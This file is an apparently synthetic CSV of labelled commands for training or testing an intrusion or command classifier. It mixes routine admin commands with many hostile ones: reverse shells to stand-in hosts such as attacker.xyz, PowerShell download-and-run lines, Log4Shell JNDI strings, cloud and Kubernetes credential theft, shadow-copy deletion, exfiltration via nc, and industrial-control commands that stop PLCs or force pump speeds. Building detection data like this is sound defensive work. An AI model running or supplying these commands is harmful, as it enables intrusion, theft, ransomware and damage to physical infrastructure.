timestamp,src_ip,input,label
2026-01-20T17:46:38.740386,83.30.187.199,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.742361,48.50.64.228,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.730167,30.121.114.61,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.733168,59.156.170.138,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.687752,26.62.167.214,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.712423,133.8.214.97,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.723165,32.183.210.131,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.740386,1.183.49.144,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.732168,221.167.226.217,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.745361,80.23.12.139,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.748407,177.196.149.147,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.725166,107.211.148.192,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.718598,56.188.135.125,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.692357,39.37.201.109,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.694354,35.100.224.146,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.750363,65.176.7.11,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.712423,123.40.15.160,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.728166,124.71.251.31,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.686752,19.113.218.160,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.717597,85.157.98.156,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.708422,197.210.82.49,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.714423,39.140.45.230,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.726165,57.240.213.209,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.743361,20.242.69.206,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.720628,37.8.212.229,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.746362,130.24.58.68,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.719650,107.175.173.37,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.707462,75.147.194.107,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.745361,116.89.150.217,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.723165,98.77.134.114,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719124,150.46.32.27,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.734167,103.62.237.83,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.687752,46.6.8.41,df -h,Normal_Business_Ops
2026-01-20T17:46:38.692357,3.161.33.176,whoami,Normal_Business_Ops
2026-01-20T17:46:38.696355,192.230.122.149,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.729167,53.60.253.178,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.686752,25.236.148.30,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.700357,185.179.128.225,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.693354,47.31.125.187,whoami,Normal_Business_Ops
2026-01-20T17:46:38.730167,175.187.255.16,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.705366,17.8.88.181,uptime,Normal_Business_Ops
2026-01-20T17:46:38.753424,223.95.75.77,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.719124,86.160.225.114,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.748363,188.186.199.230,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.718598,87.142.86.145,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.698355,26.168.7.12,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.750363,177.115.7.148,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.724165,183.201.94.201,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.709422,208.205.25.227,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.692357,167.201.117.176,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.755771,45.92.139.210,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.726165,134.216.180.157,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.715600,16.146.198.63,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.690278,212.102.157.233,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.735167,136.41.116.158,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.696355,76.52.73.246,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.692357,193.18.101.40,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.743361,217.20.25.49,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.719650,13.171.171.67,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.692357,115.139.42.84,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.733168,84.114.77.111,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.750363,8.145.1.246,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.735167,55.31.44.110,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.703359,35.176.134.75,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.747362,163.142.100.252,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,92.84.186.83,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.733168,212.42.75.82,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.750363,120.82.11.93,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.713423,173.115.200.41,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.711422,68.57.104.39,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.723165,112.38.190.253,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.702379,137.180.225.157,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.708422,86.43.21.220,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.715600,123.117.110.201,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.715600,58.151.243.118,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.754419,87.81.18.131,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.732168,60.70.40.246,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.751920,160.123.135.187,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.686752,175.125.38.15,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.750363,8.146.176.41,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.700357,104.143.192.228,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T17:46:38.742361,50.216.123.108,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.737706,71.104.17.79,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.705366,78.150.193.217,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.734167,142.145.251.134,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.692357,130.56.134.117,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.747362,87.200.251.189,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.747362,141.110.94.16,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.712423,130.33.167.166,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.694354,16.22.101.205,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.735167,186.152.210.170,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.728166,36.123.210.171,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.725166,34.84.115.69,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,211.96.80.45,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.709422,220.166.92.153,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.736168,151.149.71.9,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.731167,154.209.154.78,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.725166,159.160.171.28,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.686752,117.235.149.242,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.691848,183.195.130.105,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.709422,142.246.208.222,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.747362,111.247.105.118,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.730167,191.38.33.57,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.748407,162.175.131.114,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,191.176.6.66,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.684749,91.230.55.38,git pull,Normal_Business_Ops
2026-01-20T17:46:38.690278,103.153.248.154,git pull,Normal_Business_Ops
2026-01-20T17:46:38.722168,176.185.71.191,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.720628,33.192.45.103,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.710422,18.98.231.218,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.731167,45.10.181.201,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.693354,147.188.101.254,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.702379,72.162.153.182,df -h,Normal_Business_Ops
2026-01-20T17:46:38.688752,95.124.164.222,make build,Normal_Business_Ops
2026-01-20T17:46:38.718598,70.205.150.86,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719650,26.228.23.118,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.736168,26.113.37.140,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.739701,2.13.28.177,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.695355,213.38.72.79,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.737706,96.179.71.118,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.715600,123.136.189.171,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.731167,147.103.28.120,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.699355,35.44.36.249,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.746362,141.191.47.80,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.744361,164.174.226.154,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.734167,15.216.238.29,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.710422,80.130.222.154,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.712423,163.227.165.159,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.742361,26.186.53.210,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.742361,12.168.84.174,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.712423,13.25.194.207,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.729167,107.75.126.165,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.732168,95.207.84.132,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.707462,121.71.20.186,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.712423,88.17.90.223,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.739701,160.36.238.32,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.694354,13.165.13.168,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.713423,24.14.69.166,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.744361,168.113.108.201,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.744361,101.221.251.159,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.703359,134.23.83.33,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.685785,7.250.87.99,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.686752,202.87.133.61,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.687752,187.35.118.69,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.729167,138.129.76.96,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,120.72.62.220,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.692357,216.249.33.228,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.704359,98.30.234.44,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.706916,93.32.16.22,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.729167,217.186.113.56,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.692357,127.123.221.108,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.720628,193.229.71.228,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.746362,134.109.234.112,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.705366,94.200.107.29,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.721658,5.119.155.44,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.725166,56.99.89.116,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.683749,202.198.27.221,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.755771,156.97.179.225,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.692357,20.154.118.193,make build,Normal_Business_Ops
2026-01-20T17:46:38.754419,109.125.7.119,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.731167,182.183.123.62,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.736168,181.137.58.41,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.725166,89.175.203.78,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.744361,94.199.254.133,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.696355,80.164.73.229,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.725166,105.128.22.18,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.719650,28.112.241.77,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.738701,37.47.58.212,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.754419,91.203.33.197,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.685785,120.64.163.169,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.735167,77.199.138.91,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.735167,115.245.75.55,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.740386,77.87.84.100,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.719650,178.125.205.155,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.752911,185.10.133.83,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.701356,169.237.165.85,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.751385,155.183.66.205,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.751385,84.62.178.104,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.731167,147.219.109.74,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
